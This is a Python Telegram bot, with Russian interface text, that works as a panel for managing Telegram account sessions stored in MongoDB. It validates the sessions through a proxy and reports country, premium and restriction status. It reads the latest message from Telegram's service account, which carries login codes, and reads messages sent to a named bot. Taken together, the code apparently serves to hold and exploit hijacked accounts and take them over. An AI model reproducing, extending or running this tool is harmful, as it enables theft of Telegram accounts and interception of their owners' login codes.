import os
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetHistoryRequest
from phonenumbers import parse, geocoder

# Load env
load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
LA_ADMIN_ID = int(os.getenv("LA_ADMIN_ID"))  # Легкий админ

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
light_sessions_col = db["light_sessions"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
dp = Dispatcher(bot)

def is_main_admin(uid):
    return uid == ADMIN_ID

def is_light_admin(uid):
    return uid == LA_ADMIN_ID

@dp.message_handler(commands=['addla'])
async def add_light_admin_session(message: types.Message):
    if not is_light_admin(message.from_user.id):
        return

    try:
        data = json.loads(message.get_args())
        if not isinstance(data, list):
            raise ValueError("Формат должен быть списком JSON")

        added = 0
        for item in data:
            phone = item.get("phone")
            session = item.get("session")
            if phone and session:
                light_sessions_col.update_one(
                    {"phone": phone},
                    {"$set": {"phone": phone, "session": session}},
                    upsert=True
                )
                added += 1

        await message.reply(f"✅ Добавлено сессий: {added}")
    except Exception as e:
        await message.reply(f"❌ Ошибка при добавлении: {e}")

@dp.message_handler(commands=['log'])
async def cmd_log(message: types.Message):
    if is_main_admin(message.from_user.id):
        sessions = list(sessions_col.find({}))
    elif is_light_admin(message.from_user.id):
        sessions = list(light_sessions_col.find({}))
    else:
        return

    if not sessions:
        await message.answer("❌ Нет сессий.")
        return

    await message.answer("🔍 Проверка сессий...")
    results = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            auth = await client.is_user_authorized()
            if not auth:
                results.append(f"❌ {phone} — невалид")
            else:
                me = await client.get_me()
                country = geocoder.description_for_number(parse(phone, None), "en")
                premium = getattr(me, 'premium', False)
                blocked = bool(getattr(me, 'restriction_reason', []))
                results.append(
                    f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}"
                )
        except Exception as e:
            results.append(f"❌ {phone} — ошибка: {e}")
        finally:
            await client.disconnect()

    text = "\n".join(results)
    for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
        await message.answer(chunk)

@dp.message_handler(commands=['login'])
async def cmd_login(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗ Укажи номер телефона в формате: /login +391234567890")
        return

    session = (sessions_col.find_one({"phone": args}) if is_main_admin(message.from_user.id)
               else light_sessions_col.find_one({"phone": args}))
    if not session:
        await message.reply("❌ Сессия с этим номером не найдена.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(
            peer=777000,
            limit=1,
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0
        ))

        if history.messages:
            text = history.messages[0].message
            await message.reply(f"📨 Последний код от Telegram:\n\n`{text}`", parse_mode="Markdown")
        else:
            await message.reply("⚠️ Нет сообщений от Telegram (777000).")
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

@dp.message_handler(commands=['fa'])
async def cmd_fa(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗ Укажи номер телефона в формате: /fa +391234567890")
        return

    session = (sessions_col.find_one({"phone": args}) if is_main_admin(message.from_user.id)
               else light_sessions_col.find_one({"phone": args}))
    if not session:
        await message.reply("❌ Сессия с этим номером не найдена.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(
            peer='T686T_bot',
            limit=25,
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0
        ))

        if not history.messages:
            await message.reply("⚠️ Нет сообщений в бота @T686T_bot.")
            return

        output = "\n\n".join([f"✉️ {msg.message}" for msg in history.messages if msg.message])
        await message.reply(f"📤 Последние сообщения в @T686T_bot:\n\n{output}")
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
